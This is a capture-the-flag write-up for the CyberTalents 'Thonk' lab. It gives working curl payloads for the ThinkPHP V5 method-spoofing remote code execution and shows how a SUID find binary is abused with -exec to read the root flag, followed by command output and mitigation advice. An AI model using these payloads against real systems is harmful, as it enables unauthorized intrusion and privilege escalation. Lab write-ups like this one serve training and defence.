# Thonk - CyberTalents CTF Write-up

* **Challenge Name:** Thonk
* **Platform:** CyberTalents
* **Category:** Web / Machines
* **Difficulty:** Easy
* **Objective:** Exploit a Remote Code Execution (RCE) vulnerability, perform local reconnaissance, leverage a misconfigured SUID binary, and extract the root flag.

---

## 1. Executive Summary
"Thonk" is a beginner-friendly CTF challenge featuring an instance running an outdated **ThinkPHP V5** framework. By leveraging a known Remote Code Execution (RCE) vulnerability via method spoofing and parameter manipulation, I achieve initial code execution as the `www-data` user. Following local enumeration, I identify a custom SUID binary that allows us to escalate our privileges and retrieve the flag from `/root/flag`.

---

## 2. Reconnaissance & Initial Access (RCE)

Upon analyzing the target application, I identify that the web application runs on **ThinkPHP V5**. ThinkPHP versions 5.0.x are historically vulnerable to a well-documented RCE vulnerability stemming from improper handling of request methods and filters (`_method=__construct`).

I craft a malicious HTTP `POST` request targeting `index.php?s=captcha` to test command execution via the `system` filter:


> curl -X POST "[http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha](http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha)" \
     -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"

## Output
uid=33(www-data) gid=33(www-data) groups=33(www-data)

This confirms successful Remote Code Execution (RCE) under the low-privileged www-data service account.

## 3. Enumeration

With code execution established, I inspect the current web root directory to understand the application structure and environment configuration:   
> curl -s -X POST "[http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha](http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha)" \ -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls+-la"


## Output

total 20
drwxrwxr-x. 1 www-data www-data  109 Dec 10  2018 .
drwxr-xr-x. 1 www-data www-data   21 Jan 11  2019 ..
-rw-rw-r--. 1 www-data www-data  216 Dec 10  2018 .htaccess
-rw-rw-r--. 1 www-data www-data 1150 Dec 10  2018 favicon.ico
-rw-rw-r--. 1 www-data www-data  766 Dec 10  2018 index.php
-rw-rw-r--. 1 www-data www-data   24 Dec 10  2018 robots.txt
-rw-rw-r--. 1 www-data www-data  840 Dec 10  2018 router.php
drwxrwxr-x. 1 www-data www-data   24 Dec 10  2018 static


## 4. Privilege Escalation & Finding SUID Binaries

> curl -X POST "[http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha](http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha)" \ -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=find / -perm -u=s -type f 2>/dev/null"

/bin/mount
/bin/su
/bin/umount
/home/max/find
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd


Analysis:
Among standard system binaries, an anomalous executable stands out: /home/max/find.
Because it carries the SUID bit and belongs to a privileged context, executing it allows us to run standard find commands with elevated permissions.


## 5. Exploitation & Flag Retrieval

I leverage the custom SUID binary /home/max/find to target the protected root flag located at /root/flag. By utilizing the -exec argument of the find utility, I can execute the cat command directly through the privileged binary:

> curl -s -X POST "[http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha](http://cdcamol2z7oimz50gmdvww87a1v585l3n1jwfqz6o-web.cybertalentslabs.com/index.php?s=captcha)" \ -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%2Fhome%2Fmax%2ffind+%2Froot%2fflag+-exec+cat+%7B%7D+%5c%3b"

Output:
FLAG{??????????????????}

## 6. Conclusion
- Vulnerabilities Exploited: ThinkPHP V5 Remote Code Execution (CVE-like behavior via method overloading) and a misconfigured custom SUID binary (/home/max/find).
- Mitigation: Upgrade the ThinkPHP framework to a patched, secure version and audit the system for unauthorized or insecure SUID binaries.

